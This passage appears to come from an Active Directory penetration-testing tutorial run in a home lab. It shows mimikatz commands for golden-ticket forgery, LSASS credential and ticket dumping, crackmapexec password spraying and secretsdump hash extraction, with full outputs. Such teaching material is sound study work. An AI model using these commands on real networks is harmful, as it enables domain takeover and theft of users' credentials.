KRBTGT account (TGS Secret Key), KDC will decrypt this and issue the service ticket with the same group memberships and validation info found in the TGT. So, if you have the KRBTGT hash, you can forge your own TGT which includes the PAC data with any group membership you want! including domain admins! sending this to the KDC will result in a service ticket with a domain admin group membership inside!</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MLleHggLGDNZw31DXUz%2F-MLmBfOvr7TahzDKtIgq%2F5%20-%20USER%20to%20TGT.png?alt=media&amp;token=620beda8-59f3-4bb0-9253-9a8172937455" alt="TGS REQ" /></p><p>To grab the needed information we will use the following command</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="n">mimikatz</span> <span class="err">#</span> <span class="n">lsadump</span><span class="o">::</span><span class="n">lsa</span> <span class="o">/</span><span class="n">inject</span> <span class="o">/</span><span class="n">name</span><span class="o">:</span><span class="n">krbtgt</span>
<span class="n">Domain</span> <span class="o">:</span> <span class="n">CONTROLLER</span> <span class="o">/</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">849420856</span><span class="o">-</span><span class="mi">2351964222</span><span class="o">-</span><span class="mi">986696166</span>
<span class="n">RID</span> <span class="o">:</span>  <span class="mo">000001</span><span class="n">f6</span>  <span class="p">(</span><span class="mi">502</span><span class="p">)</span>
<span class="n">User</span> <span class="o">:</span> <span class="n">krbtgt</span>
  <span class="o">*</span> <span class="n">Primary</span>
 <span class="n">NTLM</span> <span class="o">:</span>  <span class="mi">5508500012</span><span class="n">cc005cf7082a9a89ebdfdf</span>
 <span class="n">LM</span> <span class="o">:</span>
 <span class="n">Hash</span> <span class="n">NTLM</span><span class="o">:</span>  <span class="mi">5508500012</span><span class="n">cc005cf7082a9a89ebdfdf</span>
 <span class="n">ntlm</span><span class="o">-</span>  <span class="mi">0</span><span class="o">:</span>  <span class="mi">5508500012</span><span class="n">cc005cf7082a9a89ebdfdf</span>
 <span class="n">lm</span> <span class="o">-</span>  <span class="mi">0</span><span class="o">:</span>  <span class="mi">372</span><span class="n">f405db05d3cafd27f8e6a4a097b2c</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MMGu8pD-XD5iMQICG12%2F-MMHHRakx2AaYACrfooE%2FGolden%20Ticket%20MIMKATZ.png?alt=media&amp;token=b85f8d41-4f46-49a1-9af6-577e31af0542" alt="Golden Ticket needed information" /></p><p>the same command but without /service.</p><p><code class="language-plaintext highlighter-rouge">mimikatz # kerberos::golden /user:anyuser /domain:domainname /sid:DomainSID /krbtgt:TGT-NTLM-Hash /id:userid</code></p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="n">mimikatz</span> <span class="err">#</span> <span class="n">kerberos</span><span class="o">::</span><span class="n">golden</span> <span class="o">/</span><span class="n">user</span><span class="o">:</span><span class="n">Administrator</span> <span class="o">/</span><span class="n">domain</span><span class="o">:</span><span class="n">Controller</span><span class="p">.</span><span class="n">local</span> <span class="o">/</span><span class="n">sid</span><span class="o">:</span><span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">849420856</span><span class="o">-</span><span class="mi">2351964222</span><span class="o">-</span><span class="mi">986696166</span>  <span class="o">/</span><span class="n">krbtgt</span><span class="o">:</span><span class="mi">5508500012</span><span class="n">cc005cf7082a9a89ebdfdf</span> <span class="o">/</span><span class="n">id</span><span class="o">:</span><span class="mi">500</span>
<span class="n">User</span> <span class="o">:</span> <span class="n">Administrator</span>
<span class="n">Domain</span> <span class="o">:</span> <span class="n">Controller</span><span class="p">.</span><span class="n">local</span> <span class="p">(</span><span class="n">CONTROLLER</span><span class="p">)</span>
<span class="n">SID</span> <span class="o">:</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">849420856</span><span class="o">-</span><span class="mi">2351964222</span><span class="o">-</span><span class="mi">986696166</span>
<span class="n">User</span> <span class="n">Id</span> <span class="o">:</span>  <span class="mi">500</span>
<span class="n">Groups</span> <span class="n">Id</span> <span class="o">:</span>  <span class="o">*</span><span class="mi">513</span>  <span class="mi">512</span>  <span class="mi">520</span>  <span class="mi">518</span>  <span class="mi">519</span>
<span class="n">ServiceKey</span><span class="o">:</span>  <span class="mi">5508500012</span><span class="n">cc005cf7082a9a89ebdfdf</span> <span class="o">-</span> <span class="n">rc4_hmac_nt</span>
<span class="n">Lifetime</span> <span class="o">:</span>  <span class="mi">11</span><span class="o">/</span><span class="mi">16</span><span class="o">/</span><span class="mi">2020</span>  <span class="mi">10</span><span class="o">:</span><span class="mi">10</span><span class="o">:</span><span class="mi">20</span> <span class="n">AM</span> <span class="p">;</span>  <span class="mi">11</span><span class="o">/</span><span class="mi">14</span><span class="o">/</span><span class="mi">2030</span>  <span class="mi">10</span><span class="o">:</span><span class="mi">10</span><span class="o">:</span><span class="mi">20</span> <span class="n">AM</span> <span class="p">;</span>  <span class="mi">11</span><span class="o">/</span><span class="mi">14</span><span class="o">/</span><span class="mi">2030</span>  <span class="mi">10</span><span class="o">:</span><span class="mi">10</span><span class="o">:</span><span class="mi">20</span> <span class="n">AM</span>

<span class="o">-&gt;</span> <span class="n">Ticket</span> <span class="o">:</span> <span class="n">ticket</span><span class="p">.</span><span class="n">kirbi</span>
  <span class="o">*</span> <span class="n">PAC</span> <span class="n">generated</span>
  <span class="o">*</span> <span class="n">PAC</span> <span class="kt">signed</span>
  <span class="o">*</span> <span class="n">EncTicketPart</span> <span class="n">generated</span>
  <span class="o">*</span> <span class="n">EncTicketPart</span> <span class="n">encrypted</span>
  <span class="o">*</span> <span class="n">KrbCred</span> <span class="n">generated</span>

<span class="n">Final</span> <span class="n">Ticket</span> <span class="n">Saved</span> <span class="n">to</span> <span class="n">file</span> <span class="o">!</span>
</pre></table></code></div></div><p>Then we will use this golden ticket to access other machines.</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">mimikatz</span> <span class="err">#</span> <span class="n">misc</span><span class="o">::</span><span class="n">cmd</span>
<span class="n">Patch</span> <span class="n">OK</span> <span class="k">for</span>  <span class="err">'</span><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span><span class="err">'</span> <span class="n">from</span> <span class="err">'</span><span class="n">DisableCMD</span><span class="err">'</span> <span class="n">to</span> <span class="err">'</span><span class="n">KiwiAndCMD</span><span class="err">'</span> <span class="err">@</span> <span class="mo">00007</span><span class="n">FF63A5543B8</span>
</pre></table></code></div></div><p>‌ You will now have another command prompt with access to all other machines on the network</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MMGu8pD-XD5iMQICG12%2F-MMHH-1UBR79C5s9Z76w%2Faa.png?alt=media&amp;token=f3c6617e-c59c-4902-8a48-16328d091cbf" alt="" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://gblobscdn.gitbook.com/assets%2F-MGT2pXneep03jo0FJjo%2F-MMGu8pD-XD5iMQICG12%2F-MMHH1SXjrqgT9KBvfDT%2Faa2.png?alt=media&amp;token=7acd82de-dbaa-49b5-8bde-aee95255e2ea" alt="" /></p><h2 id="lateral-movement"><strong>Lateral Movement</strong></h2><h3 id="cached-credential-storage-and-retrieval"><strong>Cached Credential Storage and Retrieval</strong></h3><p>Since Microsoft’s implementation of Kerberos makes use of single sign-on, password hashes must be stored somewhere in order to renew a TGT request. In current versions of Windows, these hashes are stored in the <strong>Local Security Authority Subsystem Service (LSASS)</strong> memory space. the LSASS process is part of the operating system and runs as SYSTEM, we need SYSTEM (or local administrator) permissions to gain access to the hashes stored on a target.</p><p>we will use Mimikatz to extract hashes.</p><p>Since the Fcastle domain user is a local administrator, we are able to launch a command prompt with elevated privileges. From this command prompt, we will run mimikatz and enter <strong>privilege::debug</strong> to engage the <strong>SeDebugPrivlege</strong> privilege, which will allow us to interact with a process owned by another account. Finally, we’ll run <strong>sekurlsa::logonpasswords</strong> to dump the credentials of all logged-on users using the <strong>Sekurlsa</strong> module. This should dump hashes for all users logged on to the current workstation or server, including remote logins like Remote Desktop sessions.</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre><span class="nl">C:</span><span class="err">\</span><span class="o">&gt;</span> <span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span>
<span class="n">mimikatz</span> <span class="err">#</span> <span class="n">privilege</span><span class="o">::</span><span class="n">debug</span>
<span class="n">Privilege</span> <span class="err">'</span><span class="mi">20</span><span class="err">'</span> <span class="n">OK</span>
<span class="n">mimikatz</span> <span class="err">#</span> <span class="n">sekurlsa</span><span class="o">::</span><span class="n">logonpasswords</span>
<span class="n">Authentication</span> <span class="n">Id</span> <span class="o">:</span> <span class="mi">0</span> <span class="p">;</span> <span class="mi">291668</span> <span class="p">(</span><span class="mo">00000000</span><span class="o">:</span><span class="mo">00047354</span><span class="p">)</span>
<span class="n">Session</span> <span class="o">:</span> <span class="n">Interactive</span> <span class="n">from</span> <span class="mi">1</span>
<span class="n">User</span> <span class="n">Name</span> <span class="o">:</span> <span class="n">Offsec</span>
<span class="n">Domain</span> <span class="o">:</span> <span class="n">CORP</span>
<span class="n">Logon</span> <span class="n">Server</span> <span class="o">:</span> <span class="n">DC01</span>
<span class="n">Logon</span> <span class="n">Time</span> <span class="o">:</span> <span class="mi">08</span><span class="o">/</span><span class="mo">02</span><span class="o">/</span><span class="mi">2018</span> <span class="mi">14</span><span class="p">.</span><span class="mi">23</span><span class="p">.</span><span class="mi">26</span>
<span class="n">SID</span> <span class="o">:</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">1602875587</span><span class="o">-</span><span class="mi">2787523311</span><span class="o">-</span><span class="mi">2599479668</span><span class="o">-</span><span class="mi">1103</span>
<span class="n">msv</span> <span class="o">:</span>
<span class="p">[</span><span class="mo">00000003</span><span class="p">]</span> <span class="n">Primary</span>
<span class="err">\</span><span class="o">*</span> <span class="n">Username</span> <span class="o">:</span> <span class="n">fcastle</span>
<span class="err">\</span><span class="o">*</span> <span class="n">Domain</span> <span class="o">:</span> <span class="n">MARVEL</span>
<span class="err">\</span><span class="o">*</span> <span class="n">NTLM</span> <span class="o">:</span> <span class="n">e2b475c11da2a0748290d87aa966c327</span>
<span class="err">\</span><span class="o">*</span> <span class="n">SHA1</span> <span class="o">:</span> <span class="mi">8</span><span class="n">c77f430e4ab8acb10ead387d64011c76400d26e</span>
<span class="err">\</span><span class="o">*</span> <span class="n">DPAPI</span> <span class="o">:</span> <span class="mi">162</span><span class="n">d313bede93b0a2e72a030ec9210f0</span>
<span class="n">tspkg</span> <span class="o">:</span>
<span class="n">wdigest</span> <span class="o">:</span>
<span class="err">\</span><span class="o">*</span> <span class="n">Username</span> <span class="o">:</span> <span class="n">fcastle</span>
<span class="err">\</span><span class="o">*</span> <span class="n">Domain</span> <span class="o">:</span> <span class="n">MARVEL</span>
<span class="err">\</span><span class="o">*</span> <span class="n">Password</span> <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span>
<span class="n">kerberos</span> <span class="o">:</span>
<span class="err">\</span><span class="o">*</span> <span class="n">Username</span> <span class="o">:</span> <span class="n">fcastle</span>
<span class="err">\</span><span class="o">*</span> <span class="n">Domain</span> <span class="o">:</span> <span class="n">MARVEL</span><span class="p">.</span><span class="n">COM</span>
<span class="err">\</span><span class="o">*</span> <span class="n">Password</span> <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span>
</pre></table></code></div></div><p>‌ Also, we will use Mimikatz to exploit Kerberos authentication by abusing TGT and service tickets. We know that Kerberos TGT and service tickets for users currently logged on to the local machine are stored for future use. These tickets are also stored in LSASS and we can use Mimikatz to interact with and retrieve our own tickets and the tickets of other local users.</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="n">mimikatz</span> <span class="err">#</span> <span class="n">sekurlsa</span><span class="o">::</span><span class="n">tickets</span>
<span class="n">Authentication</span> <span class="n">Id</span> <span class="o">:</span> <span class="mi">0</span> <span class="p">;</span> <span class="mi">291668</span> <span class="p">(</span><span class="mo">00000000</span><span class="o">:</span><span class="mo">00047354</span><span class="p">)</span>
<span class="n">Session</span> <span class="o">:</span> <span class="n">Interactive</span> <span class="n">from</span> <span class="mi">1</span>
<span class="n">User</span> <span class="n">Name</span> <span class="o">:</span> <span class="n">fcasle</span>
<span class="n">Domain</span> <span class="o">:</span> <span class="n">MARVEL</span>
<span class="n">Logon</span> <span class="n">Server</span> <span class="o">:</span> <span class="n">DC01</span>
<span class="n">Logon</span> <span class="n">Time</span> <span class="o">:</span> <span class="mi">08</span><span class="o">/</span><span class="mo">02</span><span class="o">/</span><span class="mi">2018</span> <span class="mi">14</span><span class="p">.</span><span class="mi">23</span><span class="p">.</span><span class="mi">26</span>
<span class="n">SID</span> <span class="o">:</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">1602875587</span><span class="o">-</span><span class="mi">2787523311</span><span class="o">-</span><span class="mi">2599479668</span><span class="o">-</span><span class="mi">1103</span>
<span class="o">*</span> <span class="n">Username</span> <span class="o">:</span> <span class="n">fcastle</span>
<span class="o">*</span> <span class="n">Domain</span> <span class="o">:</span> <span class="n">MARVEL</span><span class="p">.</span><span class="n">COM</span>
<span class="o">*</span> <span class="n">Password</span> <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span>
<span class="n">Group</span> <span class="mi">0</span> <span class="o">-</span> <span class="n">Ticket</span> <span class="n">Granting</span> <span class="n">Service</span>
<span class="p">[</span><span class="mo">00000000</span><span class="p">]</span>
<span class="n">Start</span><span class="o">/</span><span class="n">End</span><span class="o">/</span><span class="n">MaxRenew</span><span class="o">:</span> <span class="mi">09</span><span class="o">/</span><span class="mo">02</span><span class="o">/</span><span class="mi">2018</span> <span class="mi">14</span><span class="p">.</span><span class="mi">41</span><span class="p">.</span><span class="mi">47</span> <span class="p">;</span> <span class="mi">10</span><span class="o">/</span><span class="mo">02</span><span class="o">/</span><span class="mi">2018</span> <span class="mo">00</span><span class="p">.</span><span class="mi">41</span><span class="p">.</span><span class="mi">47</span> <span class="p">;</span> <span class="mi">16</span><span class="o">/</span><span class="mo">02</span><span class="o">/</span><span class="mi">2018</span> <span class="mi">14</span><span class="p">.</span><span class="mi">41</span><span class="p">.</span><span class="mi">47</span>
<span class="n">Service</span> <span class="n">Name</span> <span class="p">(</span><span class="mo">02</span><span class="p">)</span> <span class="o">:</span> <span class="n">cifs</span> <span class="p">;</span> <span class="n">dc01</span> <span class="p">;</span> <span class="err">@</span> <span class="n">CORP</span><span class="p">.</span><span class="n">COM</span>
<span class="n">Target</span> <span class="n">Name</span> <span class="p">(</span><span class="mo">02</span><span class="p">)</span> <span class="o">:</span> <span class="n">cifs</span> <span class="p">;</span> <span class="n">dc01</span> <span class="p">;</span> <span class="err">@</span> <span class="n">CORP</span><span class="p">.</span><span class="n">COM</span>
<span class="n">Client</span> <span class="n">Name</span> <span class="p">(</span><span class="mo">01</span><span class="p">)</span> <span class="o">:</span> <span class="n">Offsec</span> <span class="p">;</span> <span class="err">@</span> <span class="n">CORP</span><span class="p">.</span><span class="n">COM</span>
<span class="n">Flags</span> <span class="mi">40</span><span class="n">a50000</span> <span class="o">:</span> <span class="n">name_canonicalize</span> <span class="p">;</span> <span class="n">ok_as_delegate</span> <span class="p">;</span> <span class="n">pre_authent</span> <span class="p">;</span> <span class="n">renewable</span> <span class="p">;</span>
<span class="n">Session</span> <span class="n">Key</span> <span class="o">:</span> <span class="mh">0x00000012</span> <span class="o">-</span> <span class="n">aes256_hmac</span>
<span class="n">d062a1b8c909544a7130652fd4bae4c04833c3324aa2eb1d051816a7090a0718</span>
<span class="n">Ticket</span> <span class="o">:</span> <span class="mh">0x00000012</span> <span class="o">-</span> <span class="n">aes256_hmac</span> <span class="p">;</span> <span class="n">kvno</span> <span class="o">=</span> <span class="mi">3</span> <span class="p">[...]</span>
<span class="n">Group</span> <span class="mi">1</span> <span class="o">-</span> <span class="n">Client</span> <span class="n">Ticket</span> <span class="o">?</span>
</pre></table></code></div></div><h3 id="pass-the-password"><strong>Pass The Password</strong></h3><p>In this technique, you are having a valid username and password on one machine. So we are going to pass the password to the whole machines in the domain to see if this user has access over anther machines or not.</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="n">root</span><span class="err">@</span><span class="n">kali</span><span class="o">:</span> <span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">219</span><span class="p">.</span><span class="mi">0</span><span class="o">/</span><span class="mi">24</span> <span class="o">-</span><span class="n">u</span> <span class="n">fcastle</span> <span class="o">-</span><span class="n">d</span> <span class="n">MARVEL</span><span class="p">.</span><span class="n">local</span> <span class="o">-</span><span class="n">p</span> <span class="n">Password1</span>
<span class="n">SMB</span>         <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">219</span><span class="p">.</span><span class="mi">131</span> <span class="mi">445</span>    <span class="n">HYDRA</span><span class="o">-</span><span class="n">DC</span>         <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="mi">10</span><span class="p">.</span><span class="mi">0</span> <span class="n">Build</span> <span class="mi">17763</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="o">:</span><span class="n">HYDRA</span><span class="o">-</span><span class="n">DC</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="o">:</span><span class="n">MARVEL</span><span class="p">.</span><span class="n">local</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="o">:</span><span class="n">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="o">:</span><span class="n">False</span><span class="p">)</span>
<span class="n">SMB</span>         <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">219</span><span class="p">.</span><span class="mi">130</span> <span class="mi">445</span>    <span class="n">THEPUNISHER</span>      <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="mi">10</span><span class="p">.</span><span class="mi">0</span> <span class="n">Build</span> <span class="mi">19041</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="o">:</span><span class="n">THEPUNISHER</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="o">:</span><span class="n">MARVEL</span><span class="p">.</span><span class="n">local</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="o">:</span><span class="n">False</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="o">:</span><span class="n">False</span><span class="p">)</span>
<span class="n">SMB</span>         <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">219</span><span class="p">.</span><span class="mi">132</span> <span class="mi">445</span>    <span class="n">SPIDERMAN</span>        <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="mi">10</span><span class="p">.</span><span class="mi">0</span> <span class="n">Build</span> <span class="mi">19041</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="o">:</span><span class="n">SPIDERMAN</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="o">:</span><span class="n">MARVEL</span><span class="p">.</span><span class="n">local</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="o">:</span><span class="n">False</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="o">:</span><span class="n">False</span><span class="p">)</span>
<span class="n">SMB</span>         <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">219</span><span class="p">.</span><span class="mi">131</span> <span class="mi">445</span>    <span class="n">HYDRA</span><span class="o">-</span><span class="n">DC</span>         <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">MARVEL</span><span class="p">.</span><span class="n">local</span><span class="err">\</span><span class="n">fcastle</span><span class="o">:</span><span class="n">Password1</span> 
<span class="n">SMB</span>         <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">219</span><span class="p">.</span><span class="mi">130</span> <span class="mi">445</span>    <span class="n">THEPUNISHER</span>      <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">MARVEL</span><span class="p">.</span><span class="n">local</span><span class="err">\</span><span class="n">fcastle</span><span class="o">:</span><span class="n">Password1</span> <span class="p">(</span><span class="n">Pwn3d</span><span class="o">!</span><span class="p">)</span>
<span class="n">SMB</span>         <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">219</span><span class="p">.</span><span class="mi">132</span> <span class="mi">445</span>    <span class="n">SPIDERMAN</span>        <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">MARVEL</span><span class="p">.</span><span class="n">local</span><span class="err">\</span><span class="n">fcastle</span><span class="o">:</span><span class="n">Password1</span> <span class="p">(</span><span class="n">Pwn3d</span><span class="o">!</span><span class="p">)</span>
</pre></table></code></div></div><p>Now, we have got an access with the same user on anther machine SPIDERMAN.</p><h3 id="dumping-hashes"><strong>Dumping Hashes</strong></h3><p><strong>Using scretdump.py</strong></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre><td class="rouge-code"><pre>root@kali: secretsdump.py marvel/fcastle:Password1@192.168.219.130
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Service RemoteRegistry is <span class="k">in </span>stopped state
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Service RemoteRegistry is disabled, enabling it
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service RemoteRegistry
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Target system bootKey: 0xf604419dffcf03f36a1eaf70ceeb5808
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping <span class="nb">local </span>SAM hashes <span class="o">(</span>uid:rid:lmhash:nthash<span class="o">)</span>
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:81483d09ad1125d52a72c6ab40ded2f5:::
Muhammad:1001:aad3b435b51404eeaad3b435b51404ee:acbc1d7e615194dfb894cb03e0a9c91f:::
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping cached domain logon information <span class="o">(</span>domain/username:hash<span class="o">)</span>
MARVEL.LOCAL/fcastle:<span class="nv">$DCC2$10240</span><span class="c">#fcastle#e6f48c2526bd594441d3da3723155f6f</span>
MARVEL.LOCAL/Administrator:<span class="nv">$DCC2$10240</span><span class="c">#Administrator#35763304a8f65310e97fc21285d3184d</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping LSA Secrets
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="nv">$MACHINE</span>.ACC 
MARVEL<span class="se">\T</span>HEPUNISHER<span class="nv">$:</span>aes256-cts-hmac-sha1-96:88dec67ed91edafad653edf12abc5ab4fad7b5801dcfae25190b85b758be78f0
MARVEL<span class="se">\T</span>HEPUNISHER<span class="nv">$:</span>aes128-cts-hmac-sha1-96:3a62a3f16b6f5c661e79009dd52652bd
MARVEL<span class="se">\T</span>HEPUNISHER<span class="nv">$:</span>des-cbc-md5:38b067ad8097abd0
MARVEL<span class="se">\T</span>HEPUNISHER<span class="nv">$:</span>aad3b435b51404eeaad3b435b51404ee:3b12aad6f5746a2de05b7a8b18d76dd2:::
<span class="o">[</span><span class="k">*</span><span class="o">]</span> DPAPI_SYSTEM 
dpapi_machinekey:0x733cfa0609e7af0b93b12be1b3ef343eb8ac95bf
dpapi_userkey:0x76667049c9be8cb6bdf731f27f9c798f38492637
<span class="o">[</span><span class="k">*</span><span class="o">]</span> NL<span class="nv">$KM</span> 
 0000   BA 6B FB 0C 66 FE 19 5E  C3 15 CD 43 7C 66 81 D3   .k..f..^...C|f..
 0010   CB A9 10 7F F4 6B 74 CD  66 88 E1 7E 2F 0E F4 46   .....kt.f..~/..F
 0020   73 08 AF 6D 08 72 07 91  B1 C3 4B 07 11 AE 1D 64   s..m.r....K....d
 0030   59 72 2D 78 CA A7 CC 7A  ED 62 D7 F1 5B 51 0F A2   Yr-x...z.b..[Q..
NL<span class="nv">$KM</span>:ba6bfb0c66fe195ec315cd437c6681d3cba9107ff46b74cd6688e17e2f0ef4467308af6d08720791b1c34b0711ae1d6459722d78caa7cc7aed62d7f15b510fa2
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Cleaning up... 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Stopping service RemoteRegistry
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Restoring the disabled state <span class="k">for </span>service RemoteRegistry
</pre></table></code></div></div><p>###</p><p>Using Mimikatz</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre><span class="n">mimikatz</span> <span class="err">#</span> <span class="n">sekurlsa</span><span class="o">::</span><span class="n">logonpasswords</span>

<span class="n">Authentication</span> <span class="n">Id</span> <span class="o">:</span> <span class="mi">0</span> <span class="p">;</span> <span class="mi">283655</span> <span class="p">(</span><span class="mo">00000000</span><span class="o">:</span><span class="mo">00045407</span><span class="p">)</span>
<span class="n">Session</span>           <span class="o">:</span> <span class="n">Interactive</span> <span class="n">from</span> <span class="mi">2</span>
<span class="n">User</span> <span class="n">Name</span>         <span class="o">:</span> <span class="n">DWM</span><span class="o">-</span><span class="mi">2</span>
<span class="n">Domain</span>            <span class="o">:</span> <span class="n">Window</span> <span class="n">Manager</span>
<span class="n">Logon</span> <span class="n">Server</span>      <span class="o">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span>
<span class="n">Logon</span> <span class="n">Time</span>        <span class="o">:</span> <span class="mi">11</span><span class="o">/</span><span class="mi">16</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">9</span><span class="o">:</span><span class="mi">46</span><span class="o">:</span><span class="mi">09</span> <span class="n">AM</span>
<span class="n">SID</span>               <span class="o">:</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">90</span><span class="o">-</span><span class="mi">0</span><span class="o">-</span><span class="mi">2</span>
        <span class="n">msv</span> <span class="o">:</span>
         <span class="p">[</span><span class="mo">00000003</span><span class="p">]</span> <span class="n">Primary</span>
         <span class="o">*</span> <span class="n">Username</span> <span class="o">:</span> <span class="n">DOMAIN</span><span class="o">-</span><span class="n">CONTROLL</span><span class="err">$</span>
         <span class="o">*</span> <span class="n">Domain</span>   <span class="o">:</span> <span class="n">CONTROLLER</span>
         <span class="o">*</span> <span class="n">NTLM</span>     <span class="o">:</span> <span class="mi">4</span><span class="n">bd04581d16353e6bf64ba9745cb6a8f</span>
         <span class="o">*</span> <span class="n">SHA1</span>     <span class="o">:</span> <span class="mi">61</span><span class="n">f1c5a4691ad30c67adf2a371fafda0178a7b2b</span>
        <span class="n">tspkg</span> <span class="o">:</span>
        <span class="n">wdigest</span> <span class="o">:</span>
         <span class="o">*</span> <span class="n">Username</span> <span class="o">:</span> <span class="n">DOMAIN</span><span class="o">-</span><span class="n">CONTROLL</span><span class="err">$</span>
